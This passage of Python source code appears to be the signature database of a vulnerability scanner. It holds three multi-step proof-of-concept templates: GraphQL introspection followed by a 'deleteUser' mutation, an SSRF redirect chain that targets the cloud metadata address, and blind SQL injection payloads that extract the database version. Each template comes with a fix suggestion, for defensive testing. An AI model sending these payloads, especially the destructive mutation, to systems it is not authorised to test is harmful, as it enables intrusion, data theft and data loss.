            disclosure_date="2024-09-01",
        ),

        POC(
            id="multi-step-graphql-introspect",
            name="GraphQL 内省查询与敏感字段探测 - 多步检测",
            description="多步POC示例：先进行GraphQL内省查询获取schema，再探测敏感mutation字段。",
            risk_level=RiskLevel.MEDIUM,
            cvss_score=5.5,
            tags=["graphql", "multi-step", "info-disclosure", "introspection"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/graphql",
                    headers={"Content-Type": "application/json"},
                    body='{"query":"{__schema{types{name,fields{name,type{name}}}}}","variables":{}}',
                ),
                POCRequest(
                    method="POST",
                    path="/graphql",
                    headers={"Content-Type": "application/json"},
                    body='{"query":"mutation{deleteUser(id:1){success}}","variables":{}}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            matcher_groups=[
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="__schema"),
                        Matcher(type=MatcherType.WORD, value="types"),
                    ],
                    condition=MatcherCondition.AND,
                ),
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="deleteUser"),
                        Matcher(type=MatcherType.WORD, value="success"),
                    ],
                    condition=MatcherCondition.OR,
                ),
            ],
            matchers_condition=MatcherCondition.OR,
            extractors=[
                Extractor(type=ExtractorType.JSON, name="schema_types", value="data.__schema.types"),
            ],
            references=[
                "https://graphql.org/learn/introspection/",
            ],
            fix_suggestion="在生产环境禁用GraphQL内省查询。",
            disclosure_date="2024-10-01",
        ),

        POC(
            id="multi-step-ssrf-redirect-chain",
            name="SSRF 重定向链攻击 - 多步检测",
            description="多步POC示例：利用开放重定向构造SSRF攻击链，绕过URL白名单检测。",
            risk_level=RiskLevel.HIGH,
            cvss_score=7.5,
            tags=["ssrf", "multi-step", "redirect", "bypass"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/redirect?url=http://169.254.169.254/latest/meta-data/",
                ),
                POCRequest(
                    method="GET",
                    path="/api/fetch?url={{redirect_target}}",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            matcher_groups=[
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="ami-id"),
                        Matcher(type=MatcherType.STATUS, value=200),
                    ],
                    condition=MatcherCondition.AND,
                ),
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="instance-id"),
                        Matcher(type=MatcherType.STATUS, value=200),
                    ],
                    condition=MatcherCondition.AND,
                ),
            ],
            matchers_condition=MatcherCondition.OR,
            extractors=[
                Extractor(type=ExtractorType.REGEX, name="redirect_target",
                          value=r"Location:\s*(https?://[^\s]+)"),
                Extractor(type=ExtractorType.REGEX, name="ami_id",
                          value=r"ami-[a-f0-9]+"),
            ],
            references=[
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
            ],
            fix_suggestion="实施严格的URL白名单验证，禁止重定向跟随。",
            disclosure_date="2024-11-01",
        ),

        POC(
            id="multi-step-sql-blind-extract",
            name="SQL盲注逐字符提取 - 多步检测",
            description="多步POC示例：先检测SQL注入点，再逐字符提取数据库版本信息。演示复杂多步提取。",
            risk_level=RiskLevel.HIGH,
            cvss_score=7.5,
            tags=["sqli", "multi-step", "blind", "extraction"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/products?id=1' AND '1'='1",
                ),
                POCRequest(
                    method="GET",
                    path="/api/products?id=1' AND SUBSTRING(VERSION(),1,1)='{{first_char}}",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            matcher_groups=[
                MatcherGroup(
                    matchers=[
                        Matcher(type=MatcherType.WORD, value="product"),
                        Matcher(type=MatcherType.STATUS, value=200),
                    ],
                    condition=MatcherCondition.AND,
                ),
            ],
            matchers_condition=MatcherCondition.AND,
            extractors=[
                Extractor(type=ExtractorType.REGEX, name="first_char",
                          value=r"version_first_char['\"]\s*:\s*['\"]([^'\"]+)"),
            ],
            references=[
                "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
            ],
            fix_suggestion="使用参数化查询，对所有用户输入进行严格过滤。",
            disclosure_date="2024-12-01",
        ),
    ]

    for poc in pocs:
        register_poc(poc)

    logger.info(f"POC database initialized with {len(pocs)} signatures")


_init_poc_database()

try:
    from app.core.poc_db_extra import _init_extra_pocs
    _init_extra_pocs()
    logger.info("Extra POC signatures loaded successfully")
except Exception as e:
    logger.warning(f"Failed to load extra POC signatures: {e}")
